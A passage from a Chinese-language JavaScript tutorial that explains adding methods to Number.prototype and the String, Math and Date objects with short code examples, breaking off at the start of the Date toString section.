   上面代码为 ``Number`` 对象实例定义了一个 ``add`` 方法。在数值上调用某个方法，数值会自动转为 ``Number`` 的实例对象，所以就可以调用 ``add`` 方法了。由于 ``add`` 方法返回的还是数值，所以可以链式运算。

   .. code:: javascript

      Number.prototype.subtract = function (x) {
        return this - x;
      };
   
      (8).add(2).subtract(4)
      // 6

   上面代码在 ``Number`` 对象的实例上部署了 ``subtract`` 方法，它可以与 ``add`` 方法链式调用。

   我们还可以部署更复杂的方法。

   .. code:: javascript

      Number.prototype.iterate = function () {
        var result = [];
        for (var i = 0; i <= this; i++) {
          result.push(i);
        }
        return result;
      };
   
      (8).iterate()
      // [0, 1, 2, 3, 4, 5, 6, 7, 8]

   上面代码在 ``Number`` 对象的原型上部署了 ``iterate`` 方法，将一个数值自动遍历为一个数组。

   注意，数值的自定义方法，只能定义在它的原型对象 ``Number.prototype`` 上面，数值本身是无法自定义属性的。

   .. code:: javascript

      var n = 1;
      n.x = 1;
      n.x // undefined

   上面代码中， ``n`` 是一个原始类型的数值。直接在它上面新增一个属性 ``x`` ，不会报错，但毫无作用，总是返回 ``undefined`` 。这是因为一旦被调用属性， ``n`` 就自动转为 ``Number`` 的实例对象，调用结束后，该对象自动销毁。所以，下一次调用 ``n`` 的属性时，实际取到的是另一个对象，属性 ``x`` 当然就读不出来。

/🟠 String 对象
===============

概述
---

    ``String`` 对象是 JavaScript 原生提供的三个包装对象之一，用来生成字符串对象。

   .. code:: javascript

      var s1 = 'abc';
      var s2 = new String('abc');
   
      typeof s1 // "string"
      typeof s2 // "object"
   
      s2.valueOf() // "abc"

   上面代码中，变量 ``s1`` 是字符串， ``s2`` 是对象。由于 ``s2`` 是字符串对象， ``s2.valueOf`` 方法返回的就是它所对应的原始字符串。

   字符串对象是一个类似数组的对象（很像数组，但不是数组）。

   .. code:: javascript

      new String('abc')
      // String {0: "a", 1: "b", 2: "c", length: 3}
   
      (new String('abc'))[1] // "b"

   上面代码中，字符串 ``abc`` 对应的字符串对象，有数值键（ ``0`` 、 ``1`` 、 ``2`` ）和 ``length`` 属性，所以可以像数组那样取值。

   除了用作构造函数， ``String`` 对象还可以当作工具方法使用，将任意类型的值转为字符串。

   .. code:: javascript

      String(true) // "true"
      String(5) // "5"

   上面代码将布尔值 ``true`` 和数值 ``5`` ，分别转换为字符串。

静态方法
-------


String.fromCharCode()
~~~~~~~~~~~~~~~~~~~~~~

    ``String`` 对象提供的静态方法（即定义在对象本身，而不是定义在对象实例的方法），主要是 ``String.fromCharCode()`` 。该方法的参数是一个或多个数值，代表 Unicode 码点，返回值是这些码点组成的字符串。

   .. code:: javascript

      String.fromCharCode() // ""
      String.fromCharCode(97) // "a"
      String.fromCharCode(104, 101, 108, 108, 111)
      // "hello"

   上面代码中， ``String.fromCharCode`` 方法的参数为空，就返回空字符串；否则，返回参数对应的 Unicode 字符串。

   注意，该方法不支持 Unicode 码点大于 ``0xFFFF`` 的字符，即传入的参数不能大于 ``0xFFFF`` （即十进制的 65535）。

   .. code:: javascript

      String.fromCharCode(0x20BB7)
      // "ஷ"
      String.fromCharCode(0x20BB7) === String.fromCharCode(0x0BB7)
      // true

   上面代码中， ``String.fromCharCode`` 参数 ``0x20BB7`` 大于 ``0xFFFF`` ，导致返回结果出错。 ``0x20BB7`` 对应的字符是汉字 ``𠮷`` ，但是返回结果却是另一个字符（码点 ``0x0BB7`` ）。这是因为 ``String.fromCharCode`` 发现参数值大于 ``0xFFFF`` ，就会忽略多出的位（即忽略 ``0x20BB7`` 里面的 ``2`` ）。

   这种现象的根本原因在于，码点大于 ``0xFFFF`` 的字符占用四个字节，而 JavaScript 默认支持两个字节的字符。这种情况下，必须把 ``0x20BB7`` 拆成两个字符表示。

   .. code:: javascript

      String.fromCharCode(0xD842, 0xDFB7)
      // "𠮷"

   上面代码中， ``0x20BB7`` 拆成两个字符 ``0xD842`` 和 ``0xDFB7`` （即两个两字节字符，合成一个四字节字符），就能得到正确的结果。码点大于 ``0xFFFF`` 的字符的四字节表示法，由 UTF-16 编码方法决定。

实例属性
-------


String.prototype.length
~~~~~~~~~~~~~~~~~~~~~~~~

   字符串实例的 ``length`` 属性返回字符串的长度。

   .. code:: javascript

      'abc'.length // 3

实例方法
-------


String.prototype.charAt()
~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``charAt`` 方法返回指定位置的字符，参数是从 ``0`` 开始编号的位置。

   .. code:: javascript

      var s = new String('abc');
   
      s.charAt(1) // "b"
      s.charAt(s.length - 1) // "c"

   这个方法完全可以用数组下标替代。

   .. code:: javascript

      'abc'.charAt(1) // "b"
      'abc'[1] // "b"

   如果参数为负数，或大于等于字符串的长度， ``charAt`` 返回空字符串。

   .. code:: javascript

      'abc'.charAt(-1) // ""
      'abc'.charAt(3) // ""

String.prototype.charCodeAt()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``charCodeAt()`` 方法返回字符串指定位置的 Unicode 码点（十进制表示），相当于 ``String.fromCharCode()`` 的逆操作。

   .. code:: javascript

      'abc'.charCodeAt(1) // 98

   上面代码中， ``abc`` 的 ``1`` 号位置的字符是 ``b`` ，它的 Unicode 码点是 ``98`` 。

   如果没有任何参数， ``charCodeAt`` 返回首字符的 Unicode 码点。

   .. code:: javascript

      'abc'.charCodeAt() // 97

   如果参数为负数，或大于等于字符串的长度， ``charCodeAt`` 返回 ``NaN`` 。

   .. code:: javascript

      'abc'.charCodeAt(-1) // NaN
      'abc'.charCodeAt(4) // NaN

   注意， ``charCodeAt`` 方法返回的 Unicode 码点不会大于65536（0xFFFF），也就是说，只返回两个字节的字符的码点。如果遇到码点大于 65536 的字符（四个字节的字符），必须连续使用两次 ``charCodeAt`` ，不仅读入 ``charCodeAt(i)`` ，还要读入 ``charCodeAt(i+1)`` ，将两个值放在一起，才能得到准确的字符。

String.prototype.concat()
~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``concat`` 方法用于连接两个字符串，返回一个新字符串，不改变原字符串。

   .. code:: javascript

      var s1 = 'abc';
      var s2 = 'def';
   
      s1.concat(s2) // "abcdef"
      s1 // "abc"

   该方法可以接受多个参数。

   .. code:: javascript

      'a'.concat('b', 'c') // "abc"

   如果参数不是字符串， ``concat`` 方法会将其先转为字符串，然后再连接。

   .. code:: javascript

      var one = 1;
      var two = 2;
      var three = '3';
   
      ''.concat(one, two, three) // "123"
      one + two + three // "33"

   上面代码中， ``concat`` 方法将参数先转成字符串再连接，所以返回的是一个三个字符的字符串。作为对比，加号运算符在两个运算数都是数值时，不会转换类型，所以返回的是一个两个字符的字符串。

String.prototype.slice()
~~~~~~~~~~~~~~~~~~~~~~~~~

    ``slice()`` 方法用于从原字符串取出子字符串并返回，不改变原字符串。它的第一个参数是子字符串的开始位置，第二个参数是子字符串的结束位置（不含该位置）。

   .. code:: javascript

      'JavaScript'.slice(0, 4) // "Java"

   如果省略第二个参数，则表示子字符串一直到原字符串结束。

   .. code:: javascript

      'JavaScript'.slice(4) // "Script"

   如果参数是负值，表示从结尾开始倒数计算的位置，即该负值加上字符串长度。

   .. code:: javascript

      'JavaScript'.slice(-6) // "Script"
      'JavaScript'.slice(0, -6) // "Java"
      'JavaScript'.slice(-2, -1) // "p"

   如果第一个参数大于第二个参数（正数情况下）， ``slice()`` 方法返回一个空字符串。

   .. code:: javascript

      'JavaScript'.slice(2, 1) // ""

String.prototype.substring()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``substring`` 方法用于从原字符串取出子字符串并返回，不改变原字符串，跟 ``slice`` 方法很相像。它的第一个参数表示子字符串的开始位置，第二个位置表示结束位置（返回结果不含该位置）。

   .. code:: javascript

      'JavaScript'.substring(0, 4) // "Java"

   如果省略第二个参数，则表示子字符串一直到原字符串的结束。

   .. code:: javascript

      'JavaScript'.substring(4) // "Script"

   如果第一个参数大于第二个参数， ``substring`` 方法会自动更换两个参数的位置。

   .. code:: javascript

      'JavaScript'.substring(10, 4) // "Script"
      // 等同于
      'JavaScript'.substring(4, 10) // "Script"

   上面代码中，调换 ``substring`` 方法的两个参数，都得到同样的结果。

   如果参数是负数， ``substring`` 方法会自动将负数转为0。

   .. code:: javascript

      'JavaScript'.substring(-3) // "JavaScript"
      'JavaScript'.substring(4, -3) // "Java"

   上面代码中，第二个例子的参数 ``-3`` 会自动变成 ``0`` ，等同于 ``'JavaScript'.substring(4, 0)`` 。由于第二个参数小于第一个参数，会自动互换位置，所以返回 ``Java`` 。

   由于这些规则违反直觉，因此不建议使用 ``substring`` 方法，应该优先使用 ``slice`` 。

String.prototype.substr()
~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``substr`` 方法用于从原字符串取出子字符串并返回，不改变原字符串，跟 ``slice`` 和 ``substring`` 方法的作用相同。

    ``substr`` 方法的第一个参数是子字符串的开始位置（从0开始计算），第二个参数是子字符串的长度。

   .. code:: javascript

      'JavaScript'.substr(4, 6) // "Script"

   如果省略第二个参数，则表示子字符串一直到原字符串的结束。

   .. code:: javascript

      'JavaScript'.substr(4) // "Script"

   如果第一个参数是负数，表示倒数计算的字符位置。如果第二个参数是负数，将被自动转为0，因此会返回空字符串。

   .. code:: javascript

      'JavaScript'.substr(-6) // "Script"
      'JavaScript'.substr(4, -1) // ""

   上面代码中，第二个例子的参数 ``-1`` 自动转为 ``0`` ，表示子字符串长度为 ``0`` ，所以返回空字符串。

String.prototype.indexOf()，String.prototype.lastIndexOf()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``indexOf`` 方法用于确定一个字符串在另一个字符串中第一次出现的位置，返回结果是匹配开始的位置。如果返回 ``-1`` ，就表示不匹配。

   .. code:: javascript

      'hello world'.indexOf('o') // 4
      'JavaScript'.indexOf('script') // -1

    ``indexOf`` 方法还可以接受第二个参数，表示从该位置开始向后匹配。

   .. code:: javascript

      'hello world'.indexOf('o', 6) // 7

    ``lastIndexOf`` 方法的用法跟 ``indexOf`` 方法一致，主要的区别是 ``lastIndexOf`` 从尾部开始匹配， ``indexOf`` 则是从头部开始匹配。

   .. code:: javascript

      'hello world'.lastIndexOf('o') // 7

   另外， ``lastIndexOf`` 的第二个参数表示从该位置起向前匹配。

   .. code:: javascript

      'hello world'.lastIndexOf('o', 6) // 4

String.prototype.trim()
~~~~~~~~~~~~~~~~~~~~~~~~

    ``trim`` 方法用于去除字符串两端的空格，返回一个新字符串，不改变原字符串。

   .. code:: javascript

      '  hello world  '.trim()
      // "hello world"

   该方法去除的不仅是空格，还包括制表符（ ``\t`` 、 ``\v`` ）、换行符（ ``\n`` ）和回车符（ ``\r`` ）。

   .. code:: javascript

      '\r\nabc \t'.trim() // 'abc'

String.prototype.toLowerCase()，String.prototype.toUpperCase()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``toLowerCase`` 方法用于将一个字符串全部转为小写， ``toUpperCase`` 则是全部转为大写。它们都返回一个新字符串，不改变原字符串。

   .. code:: javascript

      'Hello World'.toLowerCase()
      // "hello world"
   
      'Hello World'.toUpperCase()
      // "HELLO WORLD"

String.prototype.match()
~~~~~~~~~~~~~~~~~~~~~~~~~

    ``match`` 方法用于确定原字符串是否匹配某个子字符串，返回一个数组，成员为匹配的第一个字符串。如果没有找到匹配，则返回 ``null`` 。

   .. code:: javascript

      'cat, bat, sat, fat'.match('at') // ["at"]
      'cat, bat, sat, fat'.match('xt') // null

   返回的数组还有 ``index`` 属性和 ``input`` 属性，分别表示匹配字符串开始的位置和原始字符串。

   .. code:: javascript

      var matches = 'cat, bat, sat, fat'.match('at');
      matches.index // 1
      matches.input // "cat, bat, sat, fat"

    ``match`` 方法还可以使用正则表达式作为参数，详见《正则表达式》一章。

String.prototype.search()，String.prototype.replace()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``search`` 方法的用法基本等同于 ``match`` ，但是返回值为匹配的第一个位置。如果没有找到匹配，则返回 ``-1`` 。

   .. code:: javascript

      'cat, bat, sat, fat'.search('at') // 1

    ``search`` 方法还可以使用正则表达式作为参数，详见《正则表达式》一节。

    ``replace`` 方法用于替换匹配的子字符串，一般情况下只替换第一个匹配（除非使用带有 ``g`` 修饰符的正则表达式）。

   .. code:: javascript

      'aaa'.replace('a', 'b') // "baa"

    ``replace`` 方法还可以使用正则表达式作为参数，详见《正则表达式》一节。

String.prototype.split()
~~~~~~~~~~~~~~~~~~~~~~~~~

    ``split`` 方法按照给定规则分割字符串，返回一个由分割出来的子字符串组成的数组。

   .. code:: javascript

      'a|b|c'.split('|') // ["a", "b", "c"]

   如果分割规则为空字符串，则返回数组的成员是原字符串的每一个字符。

   .. code:: javascript

      'a|b|c'.split('') // ["a", "|", "b", "|", "c"]

   如果省略参数，则返回数组的唯一成员就是原字符串。

   .. code:: javascript

      'a|b|c'.split() // ["a|b|c"]

   如果满足分割规则的两个部分紧邻着（即两个分割符中间没有其他字符），则返回数组之中会有一个空字符串。

   .. code:: javascript

      'a||c'.split('|') // ['a', '', 'c']

   如果满足分割规则的部分处于字符串的开头或结尾（即它的前面或后面没有其他字符），则返回数组的第一个或最后一个成员是一个空字符串。

   .. code:: javascript

      '|b|c'.split('|') // ["", "b", "c"]
      'a|b|'.split('|') // ["a", "b", ""]

    ``split`` 方法还可以接受第二个参数，限定返回数组的最大成员数。

   .. code:: javascript

      'a|b|c'.split('|', 0) // []
      'a|b|c'.split('|', 1) // ["a"]
      'a|b|c'.split('|', 2) // ["a", "b"]
      'a|b|c'.split('|', 3) // ["a", "b", "c"]
      'a|b|c'.split('|', 4) // ["a", "b", "c"]

   上面代码中， ``split`` 方法的第二个参数，决定了返回数组的成员数。

    ``split`` 方法还可以使用正则表达式作为参数，详见《正则表达式》一节。

String.prototype.localeCompare()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``localeCompare`` 方法用于比较两个字符串。它返回一个整数，如果小于0，表示第一个字符串小于第二个字符串；如果等于0，表示两者相等；如果大于0，表示第一个字符串大于第二个字符串。

   .. code:: javascript

      'apple'.localeCompare('banana') // -1
      'apple'.localeCompare('apple') // 0

   该方法的最大特点，就是会考虑自然语言的顺序。举例来说，正常情况下，大写的英文字母小于小写字母。

   .. code:: javascript

      'B' > 'a' // false

   上面代码中，字母 ``B`` 小于字母 ``a`` 。因为 JavaScript 采用的是 Unicode 码点比较， ``B`` 的码点是66，而 ``a`` 的码点是97。

   但是， ``localeCompare`` 方法会考虑自然语言的排序情况，将 ``B`` 排在 ``a`` 的前面。

   .. code:: javascript

      'B'.localeCompare('a') // 1

   上面代码中， ``localeCompare`` 方法返回整数1，表示 ``B`` 较大。

    ``localeCompare`` 还可以有第二个参数，指定所使用的语言（默认是英语），然后根据该语言的规则进行比较。

   .. code:: javascript

      'ä'.localeCompare('z', 'de') // -1
      'ä'.localeCompare('z', 'sv') // 1

   上面代码中， ``de`` 表示德语， ``sv`` 表示瑞典语。德语中， ``ä`` 小于 ``z`` ，所以返回 ``-1`` ；瑞典语中， ``ä`` 大于 ``z`` ，所以返回 ``1`` 。

参考链接
-------

   - Ariya Hidayat, [JavaScript String: substring, substr, slice](http://ariya.ofilabs.com/2014/02/javascript-string-substring-substr-slice.html)

/🟠 Math 对象
=============

    ``Math`` 是 JavaScript 的原生对象，提供各种数学功能。该对象不是构造函数，不能生成实例，所有的属性和方法都必须在 ``Math`` 对象上调用。

静态属性
-------

    ``Math`` 对象的静态属性，提供以下一些数学常数。

   -  ``Math.E`` ：常数 ``e`` 。
   -  ``Math.LN2`` ：2 的自然对数。
   -  ``Math.LN10`` ：10 的自然对数。
   -  ``Math.LOG2E`` ：以 2 为底的 ``e`` 的对数。
   -  ``Math.LOG10E`` ：以 10 为底的 ``e`` 的对数。
   -  ``Math.PI`` ：常数 ``π`` 。
   -  ``Math.SQRT1_2`` ：0.5 的平方根。
   -  ``Math.SQRT2`` ：2 的平方根。

   .. code:: javascript

      Math.E // 2.718281828459045
      Math.LN2 // 0.6931471805599453
      Math.LN10 // 2.302585092994046
      Math.LOG2E // 1.4426950408889634
      Math.LOG10E // 0.4342944819032518
      Math.PI // 3.141592653589793
      Math.SQRT1_2 // 0.7071067811865476
      Math.SQRT2 // 1.4142135623730951

   这些属性都是只读的，不能修改。

静态方法
-------

    ``Math`` 对象提供以下一些静态方法。

   -  ``Math.abs()`` ：绝对值
   -  ``Math.ceil()`` ：向上取整
   -  ``Math.floor()`` ：向下取整
   -  ``Math.max()`` ：最大值
   -  ``Math.min()`` ：最小值
   -  ``Math.pow()`` ：幂运算
   -  ``Math.sqrt()`` ：平方根
   -  ``Math.log()`` ：自然对数
   -  ``Math.exp()`` ： ``e`` 的指数
   -  ``Math.round()`` ：四舍五入
   -  ``Math.random()`` ：随机数

Math.abs()
~~~~~~~~~~~

    ``Math.abs`` 方法返回参数值的绝对值。

   .. code:: javascript

      Math.abs(1) // 1
      Math.abs(-1) // 1

Math.max()，Math.min()
~~~~~~~~~~~~~~~~~~~~~~~

    ``Math.max`` 方法返回参数之中最大的那个值， ``Math.min`` 返回最小的那个值。如果参数为空,  ``Math.min`` 返回 ``Infinity`` ,  ``Math.max`` 返回 ``-Infinity`` 。

   .. code:: javascript

      Math.max(2, -1, 5) // 5
      Math.min(2, -1, 5) // -1
      Math.min() // Infinity
      Math.max() // -Infinity

Math.floor()，Math.ceil()
~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Math.floor`` 方法返回小于或等于参数值的最大整数（地板值）。

   .. code:: javascript

      Math.floor(3.2) // 3
      Math.floor(-3.2) // -4

    ``Math.ceil`` 方法返回大于或等于参数值的最小整数（天花板值）。

   .. code:: javascript

      Math.ceil(3.2) // 4
      Math.ceil(-3.2) // -3

   这两个方法可以结合起来，实现一个总是返回数值的整数部分的函数。

   .. code:: javascript

      function ToInteger(x) {
        x = Number(x);
        return x < 0 ? Math.ceil(x) : Math.floor(x);
      }
   
      ToInteger(3.2) // 3
      ToInteger(3.5) // 3
      ToInteger(3.8) // 3
      ToInteger(-3.2) // -3
      ToInteger(-3.5) // -3
      ToInteger(-3.8) // -3

   上面代码中，不管正数或负数， ``ToInteger`` 函数总是返回一个数值的整数部分。

Math.round()
~~~~~~~~~~~~~

    ``Math.round`` 方法用于四舍五入。

   .. code:: javascript

      Math.round(0.1) // 0
      Math.round(0.5) // 1
      Math.round(0.6) // 1
   
      // 等同于
      Math.floor(x + 0.5)

   注意，它对负数的处理（主要是对 ``0.5`` 的处理）。

   .. code:: javascript

      Math.round(-1.1) // -1
      Math.round(-1.5) // -1
      Math.round(-1.6) // -2

Math.pow()
~~~~~~~~~~~

    ``Math.pow`` 方法返回以第一个参数为底数、第二个参数为指数的幂运算值。

   .. code:: javascript

      // 等同于 2 ** 2
      Math.pow(2, 2) // 4
      // 等同于 2 ** 3
      Math.pow(2, 3) // 8

   下面是计算圆面积的方法。

   .. code:: javascript

      var radius = 20;
      var area = Math.PI * Math.pow(radius, 2);

Math.sqrt()
~~~~~~~~~~~~

    ``Math.sqrt`` 方法返回参数值的平方根。如果参数是一个负值，则返回 ``NaN`` 。

   .. code:: javascript

      Math.sqrt(4) // 2
      Math.sqrt(-4) // NaN

Math.log()
~~~~~~~~~~~

    ``Math.log`` 方法返回以 ``e`` 为底的自然对数值。

   .. code:: javascript

      Math.log(Math.E) // 1
      Math.log(10) // 2.302585092994046

   如果要计算以10为底的对数，可以先用 ``Math.log`` 求出自然对数，然后除以 ``Math.LN10`` ；求以2为底的对数，可以除以 ``Math.LN2`` 。

   .. code:: javascript

      Math.log(100)/Math.LN10 // 2
      Math.log(8)/Math.LN2 // 3

Math.exp()
~~~~~~~~~~~

    ``Math.exp`` 方法返回常数 ``e`` 的参数次方。

   .. code:: javascript

      Math.exp(1) // 2.718281828459045
      Math.exp(3) // 20.085536923187668

Math.random()
~~~~~~~~~~~~~~

    ``Math.random()`` 返回0到1之间的一个伪随机数，可能等于0，但是一定小于1。

   .. code:: javascript

      Math.random() // 0.7151307314634323

   任意范围的随机数生成函数如下。

   .. code:: javascript

      function getRandomArbitrary(min, max) {
        return Math.random() * (max - min) + min;
      }
   
      getRandomArbitrary(1.5, 6.5)
      // 2.4942810038223864

   任意范围的随机整数生成函数如下。

   .. code:: javascript

      function getRandomInt(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
      }
   
      getRandomInt(1, 6) // 5

   返回随机字符的例子如下。

   .. code:: javascript

      function random_str(length) {
        var ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        ALPHABET += 'abcdefghijklmnopqrstuvwxyz';
        ALPHABET += '0123456789-_';
        var str = '';
        for (var i = 0; i < length; ++i) {
          var rand = Math.floor(Math.random() * ALPHABET.length);
          str += ALPHABET.substring(rand, rand + 1);
        }
        return str;
      }
   
      random_str(6) // "NdQKOr"

   上面代码中， ``random_str`` 函数接受一个整数作为参数，返回变量 ``ALPHABET`` 内的随机字符所组成的指定长度的字符串。

三角函数方法
~~~~~~~~~~

    ``Math`` 对象还提供一系列三角函数方法。

   -  ``Math.sin()`` ：返回参数的正弦（参数为弧度值）
   -  ``Math.cos()`` ：返回参数的余弦（参数为弧度值）
   -  ``Math.tan()`` ：返回参数的正切（参数为弧度值）
   -  ``Math.asin()`` ：返回参数的反正弦（返回值为弧度值）
   -  ``Math.acos()`` ：返回参数的反余弦（返回值为弧度值）
   -  ``Math.atan()`` ：返回参数的反正切（返回值为弧度值）

   .. code:: javascript

      Math.sin(0) // 0
      Math.cos(0) // 1
      Math.tan(0) // 0
   
      Math.sin(Math.PI / 2) // 1
   
      Math.asin(1) // 1.5707963267948966
      Math.acos(1) // 0
      Math.atan(1) // 0.7853981633974483

/🟠 Date 对象
=============

    ``Date`` 对象是 JavaScript 原生的时间库。它以国际标准时间（UTC）1970年1月1日00:00:00作为时间的零点，可以表示的时间范围是前后各1亿天（单位为毫秒）。

普通函数的用法
------------

    ``Date`` 对象可以作为普通函数直接调用，返回一个代表当前时间的字符串。

   .. code:: javascript

      Date()
      // "Tue Dec 01 2015 09:34:43 GMT+0800 (CST)"

   注意，即使带有参数， ``Date`` 作为普通函数使用时，返回的还是当前时间。

   .. code:: javascript

      Date(2000, 1, 1)
      // "Tue Dec 01 2015 09:34:43 GMT+0800 (CST)"

   上面代码说明，无论有没有参数，直接调用 ``Date`` 总是返回当前时间。

构造函数的用法
------------

    ``Date`` 还可以当作构造函数使用。对它使用 ``new`` 命令，会返回一个 ``Date`` 对象的实例。如果不加参数，实例代表的就是当前时间。

   .. code:: javascript

      var today = new Date();

    ``Date`` 实例有一个独特的地方。其他对象求值的时候，都是默认调用 ``.valueOf()`` 方法，但是 ``Date`` 实例求值的时候，默认调用的是 ``toString()`` 方法。这导致对 ``Date`` 实例求值，返回的是一个字符串，代表该实例对应的时间。

   .. code:: javascript

      var today = new Date();
   
      today
      // "Tue Dec 01 2015 09:34:43 GMT+0800 (CST)"
   
      // 等同于
      today.toString()
      // "Tue Dec 01 2015 09:34:43 GMT+0800 (CST)"

   上面代码中， ``today`` 是 ``Date`` 的实例，直接求值等同于调用 ``toString`` 方法。

   作为构造函数时， ``Date`` 对象可以接受多种格式的参数，返回一个该参数对应的时间实例。

   .. code:: javascript

      // 参数为时间零点开始计算的毫秒数
      new Date(1378218728000)
      // Tue Sep 03 2013 22:32:08 GMT+0800 (CST)
   
      // 参数为日期字符串
      new Date('January 6, 2013');
      // Sun Jan 06 2013 00:00:00 GMT+0800 (CST)
   
      // 参数为多个整数，
      // 代表年、月、日、小时、分钟、秒、毫秒
      new Date(2013, 0, 1, 0, 0, 0, 0)
      // Tue Jan 01 2013 00:00:00 GMT+0800 (CST)

   关于 ``Date`` 构造函数的参数，有几点说明。

   第一点，参数可以是负整数，代表1970年元旦之前的时间。

   .. code:: javascript

      new Date(-1378218728000)
      // Fri Apr 30 1926 17:27:52 GMT+0800 (CST)

   第二点，只要是能被 ``Date.parse()`` 方法解析的字符串，都可以当作参数。

   .. code:: javascript

      new Date('2013-2-15')
      new Date('2013/2/15')
      new Date('02/15/2013')
      new Date('2013-FEB-15')
      new Date('FEB, 15, 2013')
      new Date('FEB 15, 2013')
      new Date('February, 15, 2013')
      new Date('February 15, 2013')
      new Date('15 Feb 2013')
      new Date('15, February, 2013')
      // Fri Feb 15 2013 00:00:00 GMT+0800 (CST)

   上面多种日期字符串的写法，返回的都是同一个时间。

   第三，参数为年、月、日等多个整数时，年和月是不能省略的，其他参数都可以省略的。也就是说，这时至少需要两个参数，因为如果只使用“年”这一个参数， ``Date`` 会将其解释为毫秒数。

   .. code:: javascript

      new Date(2013)
      // Thu Jan 01 1970 08:00:02 GMT+0800 (CST)

   上面代码中，2013被解释为毫秒数，而不是年份。

   .. code:: javascript

      new Date(2013, 0)
      // Tue Jan 01 2013 00:00:00 GMT+0800 (CST)
      new Date(2013, 0, 1)
      // Tue Jan 01 2013 00:00:00 GMT+0800 (CST)
      new Date(2013, 0, 1, 0)
      // Tue Jan 01 2013 00:00:00 GMT+0800 (CST)
      new Date(2013, 0, 1, 0, 0, 0, 0)
      // Tue Jan 01 2013 00:00:00 GMT+0800 (CST)

   上面代码中，不管有几个参数，返回的都是2013年1月1日零点。

   最后，各个参数的取值范围如下。

   - 年：使用四位数年份，比如 ``2000`` 。如果写成两位数或个位数，则加上 ``1900`` ，即 ``10`` 代表1910年。如果是负数，表示公元前。
   - 月： ``0`` 表示一月，依次类推， ``11`` 表示12月。
   - 日： ``1`` 到 ``31`` 。
   - 小时： ``0`` 到 ``23`` 。
   - 分钟： ``0`` 到 ``59`` 。
   - 秒： ``0`` 到 ``59`` 
   - 毫秒： ``0`` 到 ``999`` 。

   注意，月份从 ``0`` 开始计算，但是，天数从 ``1`` 开始计算。另外，除了日期的默认值为 ``1`` ，小时、分钟、秒钟和毫秒的默认值都是 ``0`` 。

   这些参数如果超出了正常范围，会被自动折算。比如，如果月设为 ``15`` ，就折算为下一年的4月。

   .. code:: javascript

      new Date(2013, 15)
      // Tue Apr 01 2014 00:00:00 GMT+0800 (CST)
      new Date(2013, 0, 0)
      // Mon Dec 31 2012 00:00:00 GMT+0800 (CST)

   上面代码的第二个例子，日期设为 ``0`` ，就代表上个月的最后一天。

   参数还可以使用负数，表示扣去的时间。

   .. code:: javascript

      new Date(2013, -1)
      // Sat Dec 01 2012 00:00:00 GMT+0800 (CST)
      new Date(2013, 0, -1)
      // Sun Dec 30 2012 00:00:00 GMT+0800 (CST)

   上面代码中，分别对月和日使用了负数，表示从基准日扣去相应的时间。

日期的运算
--------

   类型自动转换时， ``Date`` 实例如果转为数值，则等于对应的毫秒数；如果转为字符串，则等于对应的日期字符串。所以，两个日期实例对象进行减法运算时，返回的是它们间隔的毫秒数；进行加法运算时，返回的是两个字符串连接而成的新字符串。

   .. code:: javascript

      var d1 = new Date(2000, 2, 1);
      var d2 = new Date(2000, 3, 1);
   
      d2 - d1
      // 2678400000
      d2 + d1
      // "Sat Apr 01 2000 00:00:00 GMT+0800 (CST)Wed Mar 01 2000 00:00:00 GMT+0800 (CST)"

静态方法
-------


Date.now()
~~~~~~~~~~~

    ``Date.now`` 方法返回当前时间距离时间零点（1970年1月1日 00:00:00 UTC）的毫秒数，相当于 Unix 时间戳乘以1000。

   .. code:: javascript

      Date.now() // 1364026285194

Date.parse()
~~~~~~~~~~~~~

    ``Date.parse`` 方法用来解析日期字符串，返回该时间距离时间零点（1970年1月1日 00:00:00）的毫秒数。

   日期字符串应该符合 RFC 2822 和 ISO 8061 这两个标准，即 ``YYYY-MM-DDTHH:mm:ss.sssZ`` 格式，其中最后的 ``Z`` 表示时区。但是，其他格式也可以被解析，请看下面的例子。

   .. code:: javascript

      Date.parse('Aug 9, 1995')
      Date.parse('January 26, 2011 13:51:50')
      Date.parse('Mon, 25 Dec 1995 13:30:00 GMT')
      Date.parse('Mon, 25 Dec 1995 13:30:00 +0430')
      Date.parse('2011-10-10')
      Date.parse('2011-10-10T14:48:00')

   上面的日期字符串都可以解析。

   如果解析失败，返回 ``NaN`` 。

   .. code:: javascript

      Date.parse('xxx') // NaN

Date.UTC()
~~~~~~~~~~~

    ``Date.UTC`` 方法接受年、月、日等变量作为参数，返回该时间距离时间零点（1970年1月1日 00:00:00 UTC）的毫秒数。

   .. code:: javascript

      // 格式
      Date.UTC(year, month[, date[, hrs[, min[, sec[, ms]]]]])
   
      // 用法
      Date.UTC(2011, 0, 1, 2, 3, 4, 567)
      // 1293847384567

   该方法的参数用法与 ``Date`` 构造函数完全一致，比如月从 ``0`` 开始计算，日期从 ``1`` 开始计算。区别在于 ``Date.UTC`` 方法的参数，会被解释为 UTC 时间（世界标准时间）， ``Date`` 构造函数的参数会被解释为当前时区的时间。

实例方法
-------

    ``Date`` 的实例对象，有几十个自己的方法，除了 ``valueOf`` 和 ``toString`` ，可以分为以下三类。

   -  ``to`` 类：从 ``Date`` 对象返回一个字符串，表示指定的时间。
   -  ``get`` 类：获取 ``Date`` 对象的日期和时间。
   -  ``set`` 类：设置 ``Date`` 对象的日期和时间。

Date.prototype.valueOf()
~~~~~~~~~~~~~~~~~~~~~~~~~

    ``valueOf`` 方法返回实例对象距离时间零点（1970年1月1日00:00:00 UTC）对应的毫秒数，该方法等同于 ``getTime`` 方法。

   .. code:: javascript

      var d = new Date();
   
      d.valueOf() // 1362790014817
      d.getTime() // 1362790014817

   预期为数值的场合， ``Date`` 实例会自动调用该方法，所以可以用下面的方法计算时间的间隔。

   .. code:: javascript

      var start = new Date();
      // ...
      var end = new Date();
      var elapsed = end - start;

to 类方法
~~~~~~~~

   **（1）Date.prototype.toString()**

    ``toString`` 方法返回一个完整的日期字符串。

   .. code:: javascript

